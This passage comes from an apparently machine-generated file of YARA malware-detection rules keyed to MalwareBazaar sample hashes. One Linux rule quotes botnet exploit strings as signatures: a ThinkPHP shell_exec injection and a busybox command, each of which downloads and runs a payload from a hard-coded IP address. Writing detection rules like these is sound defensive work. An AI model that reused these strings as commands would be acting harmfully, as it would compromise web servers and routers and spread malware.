        and all of them
}

rule Windows_9a23805b493744d541cc279f7676d724e7a0f2824612fc9393c68d49ea2eb384{
    meta:
        description = "Auto ML: 9a23805b493744d541cc279f7676d724e7a0f2824612fc9393c68d49ea2eb384"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "USER32.DLL"
        $s2 = "KERNEL32.dll"
        $s3 = "USER32.dll"
        $s4 = "GDI32.dll"
        $s5 = "mscoree.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 202KB
        and all of them
}

rule Windows_9a44c666e5abbd216aaad1d78ea84dba7526b3f613c7f3396ddd1a810e9b0356{
    meta:
        description = "Auto ML: 9a44c666e5abbd216aaad1d78ea84dba7526b3f613c7f3396ddd1a810e9b0356"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Framework.exe"
        $s2 = "kernel32.dll"
        $s3 = "mscoree.dll"
        $s4 = "clrjit.dll"
        $s5 = "32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 579KB
        and all of them
}

rule Windows_9a51ed2069f54c90bac392ebb1081aa64dee9c2705df9944bc43db671c87dd94{
    meta:
        description = "Auto ML: 9a51ed2069f54c90bac392ebb1081aa64dee9c2705df9944bc43db671c87dd94"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "BCBPet.exe"
        $s2 = "mscoree.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 735KB
        and all of them
}

rule Windows_9a52f61ff398e3f0fa6137ddb4fb3aa19e012bc8bfc20897e9fe33bf1f4bdbc3{
    meta:
        description = "Auto ML: 9a52f61ff398e3f0fa6137ddb4fb3aa19e012bc8bfc20897e9fe33bf1f4bdbc3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "OgWfTPi2zOmb2"
        $s2 = "OuWfTPi"
        $s3 = "LeeDenbighsInteractiveCV.exe"
        $s4 = "kernel32.dll"
        $s5 = "System.Windows.Shapes"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2337KB
        and all of them
}

rule Linux_9a5f20dfaf89eb0af23978f5b33145f5cc384f9f13beaa8edc69e47a04c51580{
    meta:
        description = "Auto ML: 9a5f20dfaf89eb0af23978f5b33145f5cc384f9f13beaa8edc69e47a04c51580"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://141.98.10.85/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s3 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s4 = " /bin/busybox wget http://141.98.10.85/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s5 = ".shstrtab"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 96KB
        and all of them
}

rule Windows_9a80eb8aea03ed2b2306b53cb06542e8cae92b40008851bcc7d3eff62944c5b9{
    meta:
        description = "Auto ML: 9a80eb8aea03ed2b2306b53cb06542e8cae92b40008851bcc7d3eff62944c5b9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ftpTransfer"
        $s2 = "ftpReady"
        $s3 = "ftpAborted"
        $s4 = "IdHTTPHeaderInfo"
        $s5 = "TIdHTTPOption"

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 1056KB
        and all of them
}

rule Windows_9a880d7572486dd985ed6ffbf55eee8875077d9614befc12d5fbdaafd45e86d5{
    meta:
        description = "Auto ML: 9a880d7572486dd985ed6ffbf55eee8875077d9614befc12d5fbdaafd45e86d5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "FTPjK"
        $s2 = "FtPj;"
        $s3 = "ADVAPI32.DLL"
        $s4 = "USER32.DLL"
        $s5 = "KERNEL32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 819KB
        and all of them
}
